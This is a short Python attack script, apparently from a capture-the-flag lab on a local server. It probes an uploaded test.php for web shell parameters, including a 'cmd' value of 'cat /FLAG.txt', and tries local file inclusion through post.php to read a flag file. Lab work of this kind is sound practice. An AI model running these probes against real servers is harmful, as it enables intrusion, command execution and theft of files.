import requests

base_url = "http://127.0.0.1:32891"

print("[+] Investigating test.php in uploads directory...")

# Direct access
resp = requests.get(f"{base_url}/posts/uploads/test.php")
print(f"Direct access to test.php:")
print(f"Status: {resp.status_code} | Length: {len(resp.text)}")
print(f"Content: {resp.text}")

# Try with parameters
print("\n[+] Testing test.php with various parameters...")

params_list = [
    {'file': '/FLAG.txt'},
    {'f': '/FLAG.txt'},
    {'path': '/FLAG.txt'},
    {'cmd': 'cat /FLAG.txt'},
    {'c': 'cat /FLAG.txt'},
    {'read': '/FLAG.txt'},
    {'get': '/FLAG.txt'},
]

for params in params_list:
    resp = requests.get(f"{base_url}/posts/uploads/test.php", params=params)
    if "FLAG{" in resp.text:
        print(f"\n[!!!] SUCCESS with params: {params}")
        print(resp.text)
        break
    elif len(resp.text) > 10:
        print(f"\nParams: {params} | Length: {len(resp.text)}")
        print(f"Content: {resp.text[:200]}")

# Try including test.php through LFI
print("\n[+] Including test.php through LFI...")
resp = requests.get(f"{base_url}/post.php", params={'id': 'uploads/test'})
print(f"Status: {resp.status_code} | Length: {len(resp.text)}")

if "FLAG{" in resp.text:
    print("[!!!] FOUND FLAG!")
    print(resp.text)
else:
    print(f"Content (first 500 chars): {resp.text[:500]}")

